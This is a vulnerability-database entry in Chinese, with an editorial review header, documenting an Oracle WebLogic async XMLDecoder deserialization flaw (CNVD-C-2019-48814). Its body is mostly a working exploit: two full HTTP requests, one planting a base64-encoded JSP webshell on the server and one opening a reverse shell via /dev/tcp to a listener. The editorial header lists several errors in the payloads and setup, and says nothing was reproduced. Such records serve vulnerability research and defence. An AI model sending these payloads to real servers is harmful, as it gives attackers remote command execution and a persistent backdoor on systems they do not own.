---
source: "白阁文库 BaizeSec/bylibrary"
title: "Weblogic反序列化漏洞CNVD-C-2019-48814"
product: "Oracle WebLogic async XMLDecoder"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CNVD-C-2019-48814"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "Exposed unpatched async endpoint, writable known webapp path, Linux shell"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-77fba7e0585f73a2a4cf8da4"
entity_id: "ve-77fba7e0585f73a2a4cf8da4"
schema_version: "1"
---

# Weblogic反序列化漏洞CNVD-C-2019-48814

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Exposed unpatched async endpoint, writable known webapp path, Linux shell
- 证据范围：Async SOAP upload/reverse-shell recipe likely same family as 2725, but CNVD mapping needs authoritative confirmation before identifier merge. Raw base64 read but not decoded.

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Reachable AsyncResponseService alone does not prove vulnerability
- WebLogic10.* overbroad and no patch-state matrix
- docker run is concatenated with URL and credentials, making command invalid
- Second request port49164 differs from earlier49163 and maps7002 rather than7001
- Reverse-shell XML contains unescaped ampersands
- Nested frontmatter, hardcoded deployment hash, no cleanup/fix/source provenance

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

---
title: 'Weblogic反序列化漏洞CNVD-C-2019-48814'
date: Mon, 31 Aug 2020 10:01:23 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

WebLogic 10.\* / WebLogic 12.1.3.0

### Docker 搭建环境

docker pull ismaleiva90/weblogic12

docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest [http://localhost:49163/console](http://localhost:49163/console) User: weblogic Pass: welcome1

[http://192.168.247.129:49163/\_async/AsyncResponseService](http://192.168.247.129:49163/_async/AsyncResponseService)确定目标系统对外开放/\_async/AsyncResponseService路径，存在此漏洞

写入shell

```http
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.247.129:49163
Content-Length: 1383
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

这里可以执行命令了，然后我们尝试反弹shell

```http
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.247.129:49164
Content-Length: 789
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >& /dev/tcp/192.168.247.129/12345 0>&1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```


---

> 来源：白阁文库 BaizeSec/bylibrary
